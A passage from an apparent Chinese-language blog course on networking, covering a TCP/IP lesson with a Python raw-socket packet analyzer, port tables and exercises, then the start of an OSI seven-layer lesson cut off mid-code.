class="hljs-number">65535</span>)<br>            packet_count += <span class="hljs-number">1</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;▼&#x27;</span> * <span class="hljs-number">40</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📦 数据包 #<span class="hljs-subst">&#123;packet_count&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;▼&#x27;</span> * <span class="hljs-number">40</span>&#125;</span>\n&quot;</span>)<br><br>            <span class="hljs-comment"># 1. 解析以太网帧（网络接口层）</span><br>            <span class="hljs-keyword">try</span>:<br>                dest_mac, src_mac, eth_type, data = ethernet_frame(raw_data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;🔗 网络接口层（以太网帧）&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源MAC地址: <span class="hljs-subst">&#123;src_mac&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标MAC地址: <span class="hljs-subst">&#123;dest_mac&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   协议类型: 0x<span class="hljs-subst">&#123;eth_type:04x&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-comment"># 某些系统可能不包含以太网头</span><br>                eth_type = <span class="hljs-number">0x0800</span><br>                data = raw_data<br><br>            <span class="hljs-comment"># 2. 解析IP数据包（网际层）</span><br>            <span class="hljs-keyword">if</span> eth_type == <span class="hljs-number">0x0800</span>:  <span class="hljs-comment"># IPv4</span><br>                version, header_length, ttl, proto, src_ip, target_ip, data = ipv4_packet(data)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🌐 网际层（IP数据包）&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   IP版本: IPv<span class="hljs-subst">&#123;version&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   头部长度: <span class="hljs-subst">&#123;header_length&#125;</span>字节&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   TTL: <span class="hljs-subst">&#123;ttl&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   协议: <span class="hljs-subst">&#123;proto&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源IP地址: <span class="hljs-subst">&#123;src_ip&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标IP地址: <span class="hljs-subst">&#123;target_ip&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># 3. 解析传输层</span><br>                <span class="hljs-keyword">if</span> proto == <span class="hljs-string">&#x27;TCP&#x27;</span>:<br>                    src_port, dest_port, sequence, acknowledgment, flag_urg, flag_ack, \<br>                    flag_psh, flag_rst, flag_syn, flag_fin, data = tcp_segment(data)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n🚚 传输层（TCP段）&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源端口: <span class="hljs-subst">&#123;src_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标端口: <span class="hljs-subst">&#123;dest_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   序列号: <span class="hljs-subst">&#123;sequence&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   确认号: <span class="hljs-subst">&#123;acknowledgment&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   标志位: &quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br><br>                    flags = []<br>                    <span class="hljs-keyword">if</span> flag_syn: flags.append(<span class="hljs-string">&quot;SYN&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_ack: flags.append(<span class="hljs-string">&quot;ACK&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_fin: flags.append(<span class="hljs-string">&quot;FIN&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_rst: flags.append(<span class="hljs-string">&quot;RST&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_psh: flags.append(<span class="hljs-string">&quot;PSH&quot;</span>)<br>                    <span class="hljs-keyword">if</span> flag_urg: flags.append(<span class="hljs-string">&quot;URG&quot;</span>)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;, &quot;</span>.join(flags) <span class="hljs-keyword">if</span> flags <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;无&quot;</span>)<br><br>                    <span class="hljs-comment"># 4. 应用层数据</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &gt; <span class="hljs-number">0</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📱 应用层数据&quot;</span>)<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   数据长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)&#125;</span>字节&quot;</span>)<br><br>                        <span class="hljs-comment"># 尝试解析HTTP</span><br>                        <span class="hljs-keyword">try</span>:<br>                            data_str = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                            <span class="hljs-keyword">if</span> data_str.startswith(<span class="hljs-string">&#x27;HTTP&#x27;</span>) <span class="hljs-keyword">or</span> data_str.startswith(<span class="hljs-string">&#x27;GET&#x27;</span>) <span class="hljs-keyword">or</span> \<br>                               data_str.startswith(<span class="hljs-string">&#x27;POST&#x27;</span>):<br>                                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   协议: HTTP&quot;</span>)<br>                                lines = data_str.split(<span class="hljs-string">&#x27;\\r\\n&#x27;</span>)[:<span class="hljs-number">5</span>]  <span class="hljs-comment"># 只显示前5行</span><br>                                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>                                    <span class="hljs-keyword">if</span> line:<br>                                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   <span class="hljs-subst">&#123;line&#125;</span>&quot;</span>)<br>                        <span class="hljs-keyword">except</span>:<br>                            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   数据预览: <span class="hljs-subst">&#123;data[:<span class="hljs-number">50</span>]&#125;</span>&quot;</span>)<br><br>                <span class="hljs-keyword">elif</span> proto == <span class="hljs-string">&#x27;UDP&#x27;</span>:<br>                    src_port, dest_port, length, data = udp_segment(data)<br><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📦 传输层（UDP段）&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   源端口: <span class="hljs-subst">&#123;src_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   目标端口: <span class="hljs-subst">&#123;dest_port&#125;</span>&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   长度: <span class="hljs-subst">&#123;length&#125;</span>字节&quot;</span>)<br><br>                    <span class="hljs-comment"># DNS查询/响应</span><br>                    <span class="hljs-keyword">if</span> src_port == <span class="hljs-number">53</span> <span class="hljs-keyword">or</span> dest_port == <span class="hljs-number">53</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   应用协议: DNS&quot;</span>)<br><br>                <span class="hljs-keyword">elif</span> proto == <span class="hljs-string">&#x27;ICMP&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n📡 传输层（ICMP）&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   这是一个ping或traceroute数据包&quot;</span>)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br>            <span class="hljs-comment"># 只捕获前10个包作为演示</span><br>            <span class="hljs-keyword">if</span> packet_count &gt;= <span class="hljs-number">10</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n✅ 已捕获<span class="hljs-subst">&#123;packet_count&#125;</span>个数据包，停止监听&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n\n✋ 用户停止捕获&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;📊 总共捕获了 <span class="hljs-subst">&#123;packet_count&#125;</span> 个数据包&quot;</span>)<br><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># Windows需要关闭混杂模式</span><br>        <span class="hljs-keyword">try</span>:<br>            conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>        conn.close()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">80</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">import</span> sys<br>    <span class="hljs-keyword">if</span> sys.platform == <span class="hljs-string">&#x27;win32&#x27;</span> <span class="hljs-keyword">or</span> sys.platform == <span class="hljs-string">&#x27;linux&#x27;</span> <span class="hljs-keyword">or</span> sys.platform == <span class="hljs-string">&#x27;darwin&#x27;</span>:<br>        main()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;⚠️  此程序可能需要管理员/root权限&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Linux/Mac: sudo python day04_packet_analyzer.py&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;💡 Windows: 以管理员身份运行&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="运行说明">运行说明</h3><p><strong>Linux/Mac</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> python code/day04/day04_packet_analyzer.py<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：<br>以管理员身份运行命令提示符，然后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code\day04\day04_packet_analyzer.py<br></code></pre></td></tr></table></figure><h3 id="预期输出">预期输出</h3><p>程序会实时显示捕获到的数据包的各层信息。</p><h2 id="🎓-知识小结">🎓 知识小结</h2><h3 id="今天学到了什么？">今天学到了什么？</h3><ol><li>✅ TCP/IP四层模型是实际使用的网络模型</li><li>✅ TCP/IP比OSI更简洁实用</li><li>✅ 每一层都有特定的协议和作用</li><li>✅ 数据包包含多层的头部信息</li></ol><h3 id="TCP-IP四层对应表">TCP/IP四层对应表</h3><table><thead><tr><th>TCP/IP层</th><th>主要协议</th><th>关键信息</th><th>设备</th></tr></thead><tbody><tr><td>应用层</td><td>HTTP、DNS、FTP</td><td>应用数据</td><td>-</td></tr><tr><td>传输层</td><td>TCP、UDP</td><td>端口号</td><td>-</td></tr><tr><td>网际层</td><td>IP、ICMP</td><td>IP地址</td><td>路由器</td></tr><tr><td>网络接口层</td><td>Ethernet、WiFi</td><td>MAC地址</td><td>交换机、网卡</td></tr></tbody></table><h3 id="重要协议">重要协议</h3><p><strong>应用层</strong>：</p><ul><li>HTTP（80）：网页</li><li>HTTPS（443）：加密网页</li><li>DNS（53）：域名解析</li><li>FTP（21）：文件传输</li><li>SSH（22）：远程登录</li><li>SMTP（25）：发送邮件</li></ul><p><strong>传输层</strong>：</p><ul><li>TCP：可靠传输</li><li>UDP：快速传输</li></ul><p><strong>网际层</strong>：</p><ul><li>IP：寻址和路由</li><li>ICMP：错误报告和诊断</li></ul><p><strong>网络接口层</strong>：</p><ul><li>Ethernet：有线网络</li><li>WiFi：无线网络</li></ul><h2 id="💪-练习题">💪 练习题</h2><h3 id="练习1：协议识别">练习1：协议识别</h3><p>以下端口号对应什么协议？</p><ol><li>80</li><li>443</li><li>22</li><li>3306</li><li>27017</li></ol><h3 id="练习2：层次判断">练习2：层次判断</h3><p>以下信息分别属于哪一层？</p><ol><li>192.168.1.1</li><li>AA:BB:CC:DD:EE:FF</li><li>端口8080</li><li>HTTP/1.1</li><li>TCP序列号12345</li></ol><h3 id="练习3：绘制数据包结构">练习3：绘制数据包结构</h3><p>画出一个完整的HTTP请求数据包的结构，标注每一层的头部。</p><h3 id="练习4：代码扩展">练习4：代码扩展</h3><p>扩展数据包分析器：</p><ol><li>添加数据包过滤功能（只显示特定协议）</li><li>统计各协议的数据包数量</li><li>将捕获的数据包保存到文件</li></ol><h3 id="练习5：思考题">练习5：思考题</h3><ol><li>为什么TCP/IP模型只有4层而OSI有7层？</li><li>路由器工作在哪一层？交换机呢？</li><li>防火墙可能工作在哪几层？</li></ol><h2 id="📚-扩展阅读">📚 扩展阅读</h2><h3 id="TCP-IP协议族">TCP/IP协议族</h3><p>TCP/IP不仅仅是TCP和IP两个协议，而是一整个协议族：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros">应用层：<br>┌────────────────────────────────────┐<br>│ HTTP  FTP  <span class="hljs-built_in"> DNS </span>  SMTP  SSH  等<span class="hljs-built_in">..</span>. │<br>└────────────────────────────────────┘<br><br>传输层：<br>┌──────────┬──────────┐<br>│   TCP    │   UDP    │<br>└──────────┴──────────┘<br><br>网际层：<br>┌────────────────────────────┐<br>│  <span class="hljs-built_in"> IP </span>  ICMP   ARP   IGMP   │<br>└────────────────────────────┘<br><br>网络接口层：<br>┌────────────────────────────┐<br>│ <span class="hljs-built_in"> Ethernet </span> WiFi <span class="hljs-built_in"> PPP </span> 等<span class="hljs-built_in">..</span>. │<br>└────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="常见端口号记忆">常见端口号记忆</h3><p><strong>HTTP家族</strong>：</p><ul><li>80：HTTP</li><li>443：HTTPS</li><li>8080：HTTP代理</li></ul><p><strong>文件传输</strong>：</p><ul><li>20/21：FTP</li><li>22：SFTP（SSH）</li><li>69：TFTP</li></ul><p><strong>邮件</strong>：</p><ul><li>25：SMTP（发送）</li><li>110：POP3（接收）</li><li>143：IMAP（接收）</li></ul><p><strong>数据库</strong>：</p><ul><li>3306：MySQL</li><li>5432：PostgreSQL</li><li>27017：MongoDB</li><li>6379：Redis</li></ul><p><strong>远程</strong>：</p><ul><li>22：SSH</li><li>23：Telnet</li><li>3389：RDP（Windows远程桌面）</li></ul><h3 id="实际应用场景">实际应用场景</h3><ol><li><p><strong>浏览网页</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">应用层：HTTP请求 www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>传输层：TCP 端口<span class="hljs-number">80</span><br>网际层：IP地址 <span class="hljs-number">220.181</span>.<span class="hljs-number">38.148</span><br>网络接口层：通过以太网发送<br></code></pre></td></tr></table></figure></li><li><p><strong>发送邮件</strong>：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arduino">应用层：SMTP协议<br>传输层：TCP 端口<span class="hljs-number">25</span><br>网际层：IP地址（邮件服务器）<br>网络接口层：<span class="hljs-built_in">WiFi</span><br></code></pre></td></tr></table></figure></li><li><p><strong>ping命令</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">应用层：无（ICMP是网际层协议）<br>传输层：无<br>网际层：ICMP <span class="hljs-built_in">echo</span> request<br>网络接口层：以太网<br></code></pre></td></tr></table></figure></li></ol><h2 id="🎯-明天预告">🎯 明天预告</h2><p><strong>第5天：网络命令入门 - ping</strong></p><p>我们将学习：</p><ul><li>ping命令的工作原理</li><li>ICMP协议详解</li><li>RTT（往返时间）的计算</li><li>编写自己的ping工具</li></ul><hr><p>💡 <strong>今日金句</strong>：掌握TCP/IP，就掌握了互联网的语言！</p><p>👉 <a href="day03.md">上一天：OSI七层模型</a> | <a href="../../README.md">返回目录</a> | <a href="day05.md">下一天：ping命令详解</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3天：OSI七层模型</title>
    <link href="/2025/11/10/3%E5%A4%A9%EF%BC%9AOSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/11/10/3%E5%A4%A9%EF%BC%9AOSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1>第3天：OSI七层模型</h1><blockquote><p>“网络协议就像流水线，每一层都有自己的分工。”</p></blockquote><h2 id="📚-今日目标">📚 今日目标</h2><ul><li>理解什么是OSI七层模型</li><li>掌握每一层的作用</li><li>理解数据封装和解封装过程</li><li>编写程序演示协议分层</li></ul><h2 id="🎯-为什么要分层？">🎯 为什么要分层？</h2><h3 id="生活中的例子：快递系统">生活中的例子：快递系统</h3><p>想象你要给上海的朋友寄一本书：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">你写信 ────────────────────────────&gt; 朋友读信<br>  ↓                                      ↑<br>包装快递 ──────────────────────────&gt; 拆开快递<br>  ↓                                      ↑<br>分拣中心 ──────────────────────────&gt; 分拣中心<br>  ↓                                      ↑<br>运输车辆 ──────────────────────────&gt; 运输车辆<br></code></pre></td></tr></table></figure><p><strong>每一层只关心自己的工作</strong>：</p><ul><li>你只需要写信，不管怎么运输</li><li>快递员只负责包装，不管写的什么</li><li>司机只负责开车，不管包裹里是什么</li></ul><p>这就是<strong>分层的思想</strong>！</p><h3 id="分层的好处">分层的好处</h3><ol><li><strong>降低复杂度</strong>：每层只处理自己的任务</li><li><strong>标准化接口</strong>：层与层之间有明确的接口</li><li><strong>易于维护</strong>：修改某一层不影响其他层</li><li><strong>可替换</strong>：可以更换某一层的实现</li></ol><h2 id="📊-OSI七层模型">📊 OSI七层模型</h2><p><strong>OSI</strong>（Open Systems Interconnection）是国际标准化组织（ISO）制定的网络模型。</p><h3 id="七层概览">七层概览</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌─────────────┬────────────┬──────────────┬──────────────┐<br>│  层次       │  名称      │  作用        │  例子        │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">7</span>层      │  应用层    │  为用户提供  │  HTTP、FTP   │<br>│             │Application │  网络服务    │  SMTP、DNS   │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">6</span>层      │  表示层    │  数据格式转换│  加密、压缩  │<br>│             │Presentation│  编码、加密  │  JPEG、MPEG  │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">5</span>层      │  会话层    │  建立、管理  │  RPC、SQL    │<br>│             │Session     │  会话        │              │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">4</span>层      │  传输层    │  端到端通信  │  TCP、UDP    │<br>│             │Transport   │  可靠传输    │              │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">3</span>层      │  网络层    │  路由选择    │  IP、ICMP    │<br>│             │Network     │  寻址        │              │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">2</span>层      │  数据链路层│  帧传输      │  <span class="hljs-built_in">Ethernet</span>    │<br>│             │Data Link   │  错误检测    │  <span class="hljs-built_in">WiFi</span>、PPP   │<br>├─────────────┼────────────┼──────────────┼──────────────┤<br>│  第<span class="hljs-number">1</span>层      │  物理层    │  比特传输    │  网线、光纤  │<br>│             │Physical    │  电信号      │  无线电波    │<br>└─────────────┴────────────┴──────────────┴──────────────┘<br></code></pre></td></tr></table></figure><h3 id="记忆口诀">记忆口诀</h3><p><strong>从上到下</strong>：</p><ul><li>应（应用层）</li><li>表（表示层）</li><li>会（会话层）</li><li>传（传输层）</li><li>网（网络层）</li><li>数（数据链路层）</li><li>物（物理层）</li></ul><p><strong>英文口诀</strong>：All People Seem To Need Data Processing</p><h2 id="🔍-各层详解">🔍 各层详解</h2><h3 id="第7层：应用层（Application-Layer）">第7层：应用层（Application Layer）</h3><p><strong>作用</strong>：为应用程序提供网络服务</p><p><strong>通俗理解</strong>：你直接使用的软件层面</p><p><strong>例子</strong>：</p><ul><li>浏览器打开网页（HTTP/HTTPS）</li><li>收发邮件（SMTP/POP3）</li><li>下载文件（FTP）</li><li>域名解析（DNS）</li></ul><p><strong>类比</strong>：快递公司的客服窗口</p><hr><h3 id="第6层：表示层（Presentation-Layer）">第6层：表示层（Presentation Layer）</h3><p><strong>作用</strong>：数据格式转换、加密、压缩</p><p><strong>通俗理解</strong>：翻译官</p><p><strong>例子</strong>：</p><ul><li>JPEG图片格式</li><li>MP3音频格式</li><li>加密算法（SSL/TLS）</li><li>字符编码（UTF-8）</li></ul><p><strong>类比</strong>：快递包装、封装</p><hr><h3 id="第5层：会话层（Session-Layer）">第5层：会话层（Session Layer）</h3><p><strong>作用</strong>：建立、管理、终止会话</p><p><strong>通俗理解</strong>：负责通话的接线员</p><p><strong>例子</strong>：</p><ul><li>登录会话</li><li>数据库连接</li><li>RPC远程调用</li></ul><p><strong>类比</strong>：快递单号管理系统</p><hr><h3 id="第4层：传输层（Transport-Layer）">第4层：传输层（Transport Layer）</h3><p><strong>作用</strong>：端到端的可靠传输</p><p><strong>通俗理解</strong>：确保包裹完整送达</p><p><strong>例子</strong>：</p><ul><li>TCP：可靠传输，确保数据不丢失</li><li>UDP：快速传输，不保证可靠</li></ul><p><strong>关键概念</strong>：端口号（区分不同的应用）</p><p><strong>类比</strong>：快递公司的分发系统</p><hr><h3 id="第3层：网络层（Network-Layer）">第3层：网络层（Network Layer）</h3><p><strong>作用</strong>：路由选择和寻址</p><p><strong>通俗理解</strong>：找到最佳路径</p><p><strong>例子</strong>：</p><ul><li>IP协议（IP地址）</li><li>路由器工作在这一层</li></ul><p><strong>关键概念</strong>：IP地址（定位设备位置）</p><p><strong>类比</strong>：快递运输路线规划</p><hr><h3 id="第2层：数据链路层（Data-Link-Layer）">第2层：数据链路层（Data Link Layer）</h3><p><strong>作用</strong>：帧传输，相邻节点之间的数据传输</p><p><strong>通俗理解</strong>：同一条街道内的传送</p><p><strong>例子</strong>：</p><ul><li>以太网（Ethernet）</li><li>WiFi</li><li>MAC地址</li></ul><p><strong>关键概念</strong>：MAC地址（网卡的物理地址）</p><p><strong>类比</strong>：同城快递站点之间的传递</p><hr><h3 id="第1层：物理层（Physical-Layer）">第1层：物理层（Physical Layer）</h3><p><strong>作用</strong>：在物理媒介上传输比特流</p><p><strong>通俗理解</strong>：实际的传输介质</p><p><strong>例子</strong>：</p><ul><li>网线（双绞线）</li><li>光纤</li><li>无线电波</li></ul><p><strong>关键概念</strong>：电信号、光信号、无线信号</p><p><strong>类比</strong>：快递车、飞机、轮船</p><h2 id="📦-数据封装过程">📦 数据封装过程</h2><p>当你发送数据时，数据会经过<strong>封装</strong>过程：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">应用层：    [用户数据]<br>              ↓ 添加应用层头部<br>表示层：    [表示层头部|<span class="hljs-string">用户数据]</span><br><span class="hljs-string">              ↓ 添加会话层头部</span><br><span class="hljs-string">会话层：    [会话层头部</span>|<span class="hljs-string">表示层头部</span>|<span class="hljs-string">用户数据]</span><br><span class="hljs-string">              ↓ 添加传输层头部</span><br><span class="hljs-string">传输层：    [TCP头部</span>|<span class="hljs-string">数据] ← 称为&quot;段&quot;（Segment）</span><br><span class="hljs-string">              ↓ 添加网络层头部</span><br><span class="hljs-string">网络层：    [IP头部</span>|<span class="hljs-string">TCP头部</span>|<span class="hljs-string">数据] ← 称为&quot;包&quot;（Packet）</span><br><span class="hljs-string">              ↓ 添加数据链路层头部和尾部</span><br><span class="hljs-string">数据链路层：[帧头</span>|<span class="hljs-string">IP头部</span>|<span class="hljs-string">TCP头部</span>|<span class="hljs-string">数据</span>|<span class="hljs-string">帧尾] ← 称为&quot;帧&quot;（Frame）</span><br><span class="hljs-string">              ↓ 转换为比特流</span><br><span class="hljs-string">物理层：    01010101010101... ← 比特流（Bits）</span><br></code></pre></td></tr></table></figure><h3 id="类比理解">类比理解</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm">你写的信     →  应用层数据<br>装进信封     →  传输层添加端口信息<br>写上地址     →  网络层添加<span class="hljs-built_in">IP</span>地址<br>放入包裹箱   →  数据链路层添加MAC地址<br>快递车运输   →  物理层传输<br></code></pre></td></tr></table></figure><h2 id="🔧-实战项目：协议分层演示">🔧 实战项目：协议分层演示</h2><p>让我们编写一个程序，模拟OSI七层模型的数据封装过程！</p><h3 id="代码实现">代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 